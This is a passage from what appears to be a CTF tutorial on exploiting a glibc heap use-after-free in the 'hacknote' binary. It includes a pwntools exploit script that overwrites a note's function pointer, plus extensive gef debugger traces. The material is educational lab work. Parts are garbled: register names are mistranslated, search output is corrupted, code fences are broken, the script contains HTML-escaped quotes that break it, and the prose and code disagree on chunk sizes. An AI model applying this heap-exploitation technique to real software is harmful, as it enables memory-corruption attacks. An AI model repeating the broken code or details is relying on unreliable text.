Analysis","text":"<p>We can see that Use After Free may indeed happen, so how can we make it happen and use it? It is also important to note that there is also a magic function in this program. Is it possible to make the program execute the magic function by using after after? ** A very straightforward idea is to modify the put field of the note to the address of the magic function, thus implementing the magic function when executing the print note. ** So how do you do this?</p> <p>We can simply look at the specific process of each note generation.</p> <ol> <li>The program applies 8-byte memory to store the put and content pointers in the note.</li> <li>The program requests a memory of the specified size based on the size entered, and then stores the content.<pre><code>   +-----------------+\n\n   |   put           |\n\n   +-----------------+\n\n   |   content       |       size\n\n   +-----------------+-------------------&gt;+----------------+\n\n                                          |     real       |\n\n                                          |    content     |\n\n                                          |                |\n\n                                          +----------------+\n</code></pre> </li> </ol> <p>So, according to what we learned in the heap implementation, it is clear that the note is a fastbin chunk (16 bytes in size). Our goal is to have the put field of a note as the function address of magic, then we have to find a way to make the put pointer of a note overwritten as a magic address. Since there is only one place in the program to assign a put. So we have to use the time to write real content to cover. The specific ideas adopted are as follows</p> <ul> <li>Apply note0, real content size is 16 (the size is different from the bin where the note size is located)</li> <li>Apply note1, real content size is 16 (the size is different from the bin where the note size is located)</li> <li>Release note0</li> <li>Release note1</li> <li>At this point, the fast bin chunk size of 16 is note1-&gt;note0</li> <li>Apply note2 and set the size of real content to 8, then according to the heap allocation rules</li> <li>note2 will actually allocate the memory block corresponding to note1.</li> <li>real content The corresponding chunk is actually note0.</li> <li>If we write the magic address to the chunk part of the note2 real content at this time, then since we don't have note0 NULL. When we try to output note0 again, the program will call the magic function.</li> </ul>"},{"location":"pwn/linux/glibc-heap/use_after_free/#using-scripts","title":"Using scripts","text":"<pre><code>#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\n\n\nr = process('./hacknote')\n\n\n\n\n\ndef addnote(size, content):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"1\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(size))\n\n    r.recvuntil(\":\")\n\n    r.sendline(content)\n\n\n\n\n\ndef delnote(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"2\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\ndef printnote(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"3\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\n#gdb.attach(r)\n\nmagic = 0x08048986\n\n\n\naddnote(32, \"aaaa\") # add note 0\n\naddnote (32, &amp;quot;daa&amp;quot;) # add note 1\n\n\ndelnote(0) # delete note 0\n\ndelnote(1) # delete note 1\n\n\naddnote(8, p32(magic)) # add note 2\n\n\n\nprintnote(0) # print note 0\n\n\n\nr.interactive()\n</code></pre> <p>We can look at the execution process specifically, first break down the breakpoint</p> <p>Two malloc breakpoints</p> <pre><code>gef\u27a4  b *0x0804875C\n\nBreakpoint 1 at 0x804875c\n\ngef\u27a4  b *0x080486CA\n\nBreakpoint 2 at 0x80486ca\n</code></pre> <p>Two free breakpoints</p> <pre><code>gef\u27a4  b *0x08048893\n\nBreakpoint 3 at 0x8048893\n\ngef\u27a4  b *0x080488A9\n\nBreakpoint 4 at 0x80488a9\n</code></pre> <p>Then continue to execute the program, you can see that when you apply for note0, the requested memory block address is 0x0804b008. (eax storage function return value)</p> <p><code>`</code>asm $eax   : 0x0804b008  \u2192  0x00000000</p> <p>$ebx   : 0x00000000</p> <p>$ ecx: 0xf7fac780 \u2192 0x00000000 $edx   : 0x0804b008  \u2192  0x00000000</p> <p>$esp   : 0xffffcf10  \u2192  0x00000008</p> <p>$ebp   : 0xffffcf48  \u2192  0xffffcf68  \u2192  0x00000000</p> <p>$ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x080486cf \u2192  add esp, 0x10 $cs    : 0x00000023 <p>$ss    : 0x0000002b</p> <p>$ds    : 0x0000002b</p> <p>$ is: 0x0000002b $fs    : 0x00000000</p> <p>$gs    : 0x00000063</p> <p>$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500</p> <pre><code>0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax\n\n0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al\n\n0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;\n</code></pre> <p>\u2192  0x80486cf     add    esp, 0x10 <pre><code>0x80486d2 &lt;add_note+92&gt;    mov    edx, eax\n\n0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]\n\n0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx\n</code></pre> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500</p> <p>['0xffffcf10', 'l8']</p> <p>8</p> <p>0xffffcf10\u2502+0x00: 0x00000008     \u2190 $esp</p> <p>0xffffcf14\u2502+0x04: 0x00000000</p> <p>0xffffcf18\u2502+0x08: 0xf7e29ef5  \u2192   add eax, 0x18210b <p>0xffffcf1c\u2502+0x0c: 0xf7e27260  \u2192   add esp, 0x1c <p>0xffffcf20\u2502+0x10: 0xffffcf58  \u2192  0xffff0a31  \u2192  0x00000000</p> <p>0xffffcf24\u2502+0x14: 0x00000000</p> <p>0xffffcf28\u2502+0x18: 0x0000000a</p> <p>0xffffcf2c\u2502+0x1c: 0x00000000</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500</p> <p>---Type  to continue, or q  to quit--- <p>[#0] 0x80486cf \u2192 Name: add_note()</p> <p>[#1] 0x8048ac5 \u2192 Name: main()</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>gef\u27a4  heap chunk 0x0804b008</p> <p>UsedChunk(addr=0x804b008, size=0x10)</p> <p>Chunk size: 16 (0x10)</p> <p>Usable size: 12 (0xc)</p> <p>Previous chunk size: 0 (0x0)</p> <p>PREV_INUSE flag: On</p> <p>IS_MMAPPED flag: Off</p> <p>NON_MAIN_ARENA flag: Off</p> <pre><code>**The address of the content of the application note 0 is 0x0804b018**\n\n\n`` `asm\n$eax   : 0x0804b018  \u2192  0x00000000\n\n$ebx   : 0x0804b008  \u2192  0x0804865b  \u2192  &lt;print_note_content+0&gt; push ebp\n\n$ ecx: 0xf7fac780 \u2192 0x00000000\n$edx   : 0x0804b018  \u2192  0x00000000\n\n$esp   : 0xffffcf10  \u2192  0x00000020\n\n$ebp   : 0xffffcf48  \u2192  0xffffcf68  \u2192  0x00000000\n\n$ you are: 0xf7fac000 \u2192 0x001b1db0\n$ edi: 0xf7fac000 \u2192 0x001b1db0\n$ Eip: 0x08048761 \u2192 &lt;add_note+235&gt; add esp, 0x10\n$cs    : 0x00000023\n\n$ss    : 0x0000002b\n\n$ds    : 0x0000002b\n\n$ is: 0x0000002b\n$fs    : 0x00000000\n\n$gs    : 0x00000063\n\n$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500\n\n    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804\n\n    0x8048757 &lt;add_note+225&gt;   call   0x581173df\n\n    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;\n\n \u2192  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10\n\n    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax\n\n    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]\n\n    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0xffffcf10', 'l8']\n\n8\n\n0xffffcf10\u2502+0x00: 0x00000020     \u2190 $esp\n\n0xffffcf14\u2502+0x04: 0xffffcf34  \u2192  0xf70a3233\n\n0xffffcf18\u2502+0x08: 0x00000008\n\n0xffffcf1c\u2502+0x0c: 0xf7e27260  \u2192  &lt;atoi+16&gt; add esp, 0x1c\n\n0xffffcf20\u2502+0x10: 0xffffcf58  \u2192  0xffff0a31  \u2192  0x00000000\n\n0xffffcf24\u2502+0x14: 0x00000000\n\n0xffffcf28\u2502+0x18: 0x0000000a\n\n0xffffcf2c\u2502+0x1c: 0x00000000\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---\n\n[#0] 0x8048761 \u2192 Name: add_note()\n\n[#1] 0x8048ac5 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ngef\u27a4  heap chunk 0x0804b018\n\nUsedChunk(addr=0x804b018, size=0x28)\n\nChunk size: 40 (0x28)\n\nUsable size: 36 (0x24)\nPrevious chunk size: 0 (0x0)\n\nPREV_INUSE flag: On\n\nIS_MMAPPED flag: Off\n\nNON_MAIN_ARENA flag: Off\n</code></pre> <p>Similarly, we can get the address of note1 and the address of its content are 0x0804b040 and 0x0804b050 respectively.</p> <p>At the same time, we can also see that the content corresponding to note0 and note1 is indeed the corresponding memory block.</p> <p><code>`</code>asm given grip [+] Searching 'aaaa' in memory</p> <p>[+] In '[heap]'(0x804b000-0x806c000), permission=rw-</p> <p>0x804b018 - 0x804b01c  \u2192   \"aaaa\" </p> <p>grap daa [+] Searching 'deaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw-</p> <p>0x804b050 - 0x804b054 \u2192 \"good\" <pre><code>Here is the free process. We can find in turn that the content of note0 is free first.\n\n\n`` `asm\n \u2192  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;\n\n   \u21b3   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018\n\n       0x80484c6 &lt;free@plt+6&gt;     push   0x18\n\n0x80484cb &lt;free@plt+11&gt; jmp 0x8048480\n       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0xffffcf20', 'l8']\n\n8\n\n0xffffcf20\u2502+0x00: 0x0804b018  \u2192  \"aaaa\"  \u2190 $esp\n</code></pre></p> <p>Then note0 itself</p> <p><code>`</code>asm  \u2192  0x80488a9    call   0x80484c0 free@plt <p>\u21b3   0x80484c0 free@plt+0     jmp    DWORD PTR ds:0x804a018</p> <pre><code>   0x80484c6 &lt;free@plt+6&gt;     push   0x18\n</code></pre> <p>0x80484cb free@plt+11 jmp 0x8048480        0x80484d0 __stack_chk_fail@plt+0 jmp    DWORD PTR ds:0x804a01c</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500</p> <p>['0xffffcf20', 'l8']</p> <p>8</p> <p>0xffffcf20\u2502+0x00: 0x0804b008  \u2192  0x0804865b  \u2192   push ebp  \u2190 $esp <pre><code>When the delete is over, let&amp;#39;s take a look at the bins and we can see that it is actually stored in the corresponding fast bin.\n\n\n```c++\n\ngef\u27a4  heap bins\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nFastbins[idx=0, size=0x8]  \u2190  UsedChunk(addr=0x804b008, size=0x10) \n\nFastbins[idx=1, size=0xc] 0x00\n\nFastbins[idx=2, size=0x10] 0x00\n\nFastbins[idx=3, size=0x14]  \u2190  UsedChunk(addr=0x804b018, size=0x28) \n\nFastbins[idx=4, size=0x18] 0x00\n\nFastbins[idx=5, size=0x1c] 0x00\n\nFastbins[idx=6, size=0x20] 0x00\n</code></pre> <p>After we have deleted all the note1, watch bins again. It can be seen that the chunk block deleted later is indeed in the header.</p> <p><code>`</code>asm gef\u27a4  heap bins</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>Fastbins[idx=0, size=0x8]  \u2190  UsedChunk(addr=0x804b040, size=0x10)  \u2190  UsedChunk(addr=0x804b008, size=0x10) </p> <p>Fastbins[idx=1, size=0xc] 0x00</p> <p>Fastbins[idx=2, size=0x10] 0x00</p> <p>Fastbins[idx=3, size=0x14]  \u2190  UsedChunk(addr=0x804b050, size=0x28)  \u2190  UsedChunk(addr=0x804b018, size=0x28) </p> <p>Fastbins[idx=4, size=0x18] 0x00</p> <p>Fastbins[idx=5, size=0x1c] 0x00</p> <p>Fastbins[idx=6, size=0x20] 0x00</p> <pre><code>Then, at this time, we will apply for note2, we can see what memory block is applied to note2, as follows\n\n\n**The memory block corresponding to note2 is 0x804b040, which is actually the memory address corresponding to note1. **\n\n\n`` `asm\n[+] Heap-Analysis - malloc(8)=0x804b040\n\n[+] Heap-Analysis - malloc(8)=0x804b040\n\n0x080486cf in add_note ()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500\n\n$eax   : 0x0804b040  \u2192  0x0804b000  \u2192  0x00000000\n\n$ebx   : 0x00000000\n\n$ ecx: 0xf7fac780 \u2192 0x00000000\n$edx   : 0x0804b040  \u2192  0x0804b000  \u2192  0x00000000\n\n$esp   : 0xffffcf10  \u2192  0x00000008\n\n$ebp   : 0xffffcf48  \u2192  0xffffcf68  \u2192  0x00000000\n\n$ you are: 0xf7fac000 \u2192 0x001b1db0\n$ edi: 0xf7fac000 \u2192 0x001b1db0\n$ Eip: 0x080486cf \u2192 &lt;add_note+89&gt; add esp, 0x10\n$cs    : 0x00000023\n\n$ss    : 0x0000002b\n\n$ds    : 0x0000002b\n\n$ is: 0x0000002b\n$fs    : 0x00000000\n\n$gs    : 0x00000063\n\n$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500\n\n    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax\n\n    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al\n\n    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;\n\n \u2192  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10\n</code></pre> <p>**The memory address of the content of the note2 is 0x804b008, which is the address corresponding to note0. That is, when we write the content to the content of note2, the put field of note0 will be overwritten. **</p> <p><code>`</code>asm gef\u27a4  n 1</p> <p>[+] Heap-Analysis - malloc(8)=0x804b008</p> <p>[+] Heap-Analysis - malloc(8)=0x804b008</p> <p>0x08048761 in add_note ()</p> 